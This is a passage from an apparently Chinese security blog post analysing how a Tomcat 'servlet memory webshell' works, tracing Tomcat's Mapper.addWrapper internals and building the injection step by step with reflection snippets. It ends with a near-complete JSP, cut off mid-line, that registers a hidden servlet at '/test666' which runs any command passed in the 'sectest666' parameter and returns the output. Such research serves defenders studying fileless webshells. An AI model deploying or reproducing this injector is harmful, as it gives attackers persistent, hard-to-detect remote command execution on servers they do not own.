class="keyword">boolean</span> resourceOnly)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">synchronized</span> (context) &#123;</span><br><span class="line">           <span class="keyword">if</span> (path.endsWith(<span class="string">"/*"</span>)) &#123;</span><br><span class="line">               <span class="comment">// Wildcard wrapper</span></span><br><span class="line">               String name = path.substring(<span class="number">0</span>, path.length() - <span class="number">2</span>);</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.wildcardWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers = <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.wildcardWrappers = newWrappers;</span><br><span class="line">                   <span class="keyword">int</span> slashCount = slashCount(newWrapper.name);</span><br><span class="line">                   <span class="keyword">if</span> (slashCount &gt; context.nesting) &#123;</span><br><span class="line">                       context.nesting = slashCount;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">"*."</span>)) &#123;</span><br><span class="line">               <span class="comment">// Extension wrapper</span></span><br><span class="line">               String name = path.substring(<span class="number">2</span>);</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.extensionWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers =</span><br><span class="line">                   <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.extensionWrappers = newWrappers; <span class="comment">//extensionWrappers赋值</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.equals(<span class="string">"/"</span>)) &#123;</span><br><span class="line">               <span class="comment">// Default wrapper</span></span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(<span class="string">""</span>, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               context.defaultWrapper = newWrapper; <span class="comment">//defaultWrapper赋值</span></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// Exact wrapper</span></span><br><span class="line">               <span class="keyword">final</span> String name;</span><br><span class="line">               <span class="keyword">if</span> (path.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                   <span class="comment">// Special case for the Context Root mapping which is</span></span><br><span class="line">                   <span class="comment">// treated as an exact match</span></span><br><span class="line">                   name = <span class="string">"/"</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   name = path;</span><br><span class="line">               &#125;</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.exactWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers = <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.exactWrappers = newWrappers;  <span class="comment">//exactWrappers赋值</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104110344314.png" alt="image-20210104110344314"></p>
+<p>​        我们要调用addWrapper来设置wrapper的属性，首先得解决几个问题：</p>
+<h4 id="问题一：如何获取-ContextVersion对象？"><a href="#问题一：如何获取-ContextVersion对象？" class="headerlink" title="问题一：如何获取 ContextVersion对象？"></a><strong>问题一：如何获取 ContextVersion对象？</strong></h4><p>​        查看addWrapper的调用链，addWrapper是由org.apache.catalina.mapper.Mapper#addWrappers(org.apache.catalina.mapper.Mapper.ContextVersion, java.util.Collection&lt;org.apache.catalina.mapper.WrapperMappingInfo&gt;)调用的，而addWrappers中已经传入了ContextVersion对象，所以需要继续向上追踪。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104112628640.png" alt="image-20210104112628640"></p>
+<p>​        在org.apache.catalina.mapper.Mapper#addContextVersion中，创建了ContextVersion对象，但是创建直接创建这个对象需要resources这个属性，而这个属性是StandardRoot对象，在运行过程中无法通过standardContext来获取，所以不考虑通过new的方式创建ContextVersion对象，但是经过分析ContextVersion对象会被保存到mapper的contextObjectToContextVersionMap，因此可以通过获取mapper-》contextObjectToContextVersionMap-》ContextVersion来获取ContextVersion对象。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144102396.png" alt="image-20210104144102396"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144140687.png" alt="image-20210104144140687"></p>
+<p>​        可以将获取ContextVersion是的问题转换为获取Mapper对象的问题。继续向上跟踪org.apache.catalina.mapper.MapperListener#registerContext中，通过mapper对象来调用的addContextVersion。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113652212.png" alt="image-20210104113652212"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113753731.png" alt="image-20210104113753731"></p>
+<p>​        经过调试发现，mapper对象可以通过StandardService来获取，而applicationContext中可以获取service对象，因此获取ContextVersion的问题可以解决。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113819306.png" alt="image-20210104113819306"></p>
+<h4 id="问题二：如何创建一个Wrapper对象？"><a href="#问题二：如何创建一个Wrapper对象？" class="headerlink" title="问题二：如何创建一个Wrapper对象？"></a>问题二：如何创建一个Wrapper对象？</h4><p>​        在addWrapper中的wrapper是一个StandardWrapper对象，所以要分析如何获取StandardWrapper对象。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115103558.png" alt="image-20210104115103558"></p>
+<p>​        在StandardWrapper的构造方法打断点，可以看到在org.apache.catalina.core.StandardContext#createWrapper中，可以获取StandardWrapper对象。StandardContext是可以动态获取的，因此可以通过StandardContext.createWrapper方法获取到StandardWrapper对象。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115418557.png" alt="image-20210104115418557"></p>
+<p>​        但查看addWrapper方法中的wrapper对象，其使用的还是非常多的。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104120216543.png" alt="image-20210104120216543"></p>
+<p>​        但是这点不用担心，因为通过<code>new StandardWrapper()</code>创建wrapper就会设置很多属性，只要对instance、servletclass、mappings等和servlet有关的属性设置就可以了。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104134133813.png" alt="image-20210104134133813"></p>
+<h2 id="servlet内存马实现"><a href="#servlet内存马实现" class="headerlink" title="servlet内存马实现"></a>servlet内存马实现</h2><p>​        在本部分的内容不讲如何获取standardContext、applicationContext等对象了，之前在Filter内存马的时候分析过了。假设已经获取了standardContext、applicationContext对象，下面获取其他对象。</p>
+<h3 id="获取ContextVersion"><a href="#获取ContextVersion" class="headerlink" title="获取ContextVersion"></a>获取ContextVersion</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>); <span class="comment">//通过applicationContext获取service对象</span></span><br><span class="line">serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">Mapper mapper = service.getMapper(); <span class="comment">//获取mapper</span></span><br><span class="line">Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>); </span><br><span class="line">contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper); <span class="comment">//获取contextObjectToContextVersionMap属性</span></span><br><span class="line">Object contextVersion = contextObjectToContextVersionMap.get(standardContext); <span class="comment">//获取contextVersion对象</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144759287.png" alt="image-20210104144759287"></p>
+<h3 id="创建Wrapper对象并赋值"><a href="#创建Wrapper对象并赋值" class="headerlink" title="创建Wrapper对象并赋值"></a>创建Wrapper对象并赋值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper(); <span class="comment">//获取StandardWrapper对象</span></span><br><span class="line">TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); <span class="comment">//创建servlet对象</span></span><br><span class="line">Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>); <span class="comment">//获取StandardWrapper打的instance属性</span></span><br><span class="line">instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">instanceF.set(wrappershell,tomcatServlet); <span class="comment">//为instance属性赋值</span></span><br><span class="line">wrappershell.setServletClass(Class.forName(<span class="string">"TomcatServlet"</span>).getName()); <span class="comment">//设置servletclass属性，可以通过setServletClass实现，因此不需要通过反射机制修改。</span></span><br></pre></td></tr></table></figure>
+
+<p>​        通过上面的设置，可以得到StandardWrapper对象，并且设置其中的instance和servletClass属性，下面尝试通过<code>wrappershell.addMapping(&quot;/test666&quot;);</code>但是这么设置后由于没有给StandardWrapper设置parent属性所以会抛异常。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141540768.png" alt="image-20210104141540768"></p>
+<p>​        在addWrapper方法中，wrapper.parent是StandardContext对象，因此需要设置StandardWrapper.parent为StandardContext。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141837343.png" alt="image-20210104141837343"></p>
+<p>​        parent属性的定义在org.apache.catalina.core.ContainerBase中</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104142155491.png" alt="image-20210104142155491"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">parent.set(wrappershell, standardContext);</span><br><span class="line">wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="addWrapper设置exactWrappers"><a href="#addWrapper设置exactWrappers" class="headerlink" title="addWrapper设置exactWrappers"></a>addWrapper设置exactWrappers</h3><p>​        下面通过反射调用addWrapper</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">Class contextversionClass = classes[<span class="number">1</span>]; <span class="comment">//获取内部类contextversion的Class</span></span><br><span class="line">Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>); <span class="comment">//反射调用addWrapper</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150812155.png" alt="image-20210104150812155"></p>
+<p>​        最终成功实现内存马的功能。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150927298.png" alt="image-20210104150927298"></p>
+<p>​        给出完整的JSP代码，如下所示：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardService"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.mapper.Mapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.concurrent.ConcurrentHashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Wrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardWrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ContainerBase"</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TomcatServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = req.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            resp.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            resp.getOutputStream().flush();</span><br><span class="line">            resp.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test666</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">            modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                out.println(<span class="string">"WRAP_SAME_OBJECT change success!please try again for Inject Servlet"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">                javax.servlet.ServletRequest request1 = threadLocalRequest.get();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request1.getServletContext();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                    Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>);</span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); </span><br><span class="line">                        StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                        Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                        instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                        wrappershell.setServletClass(<span 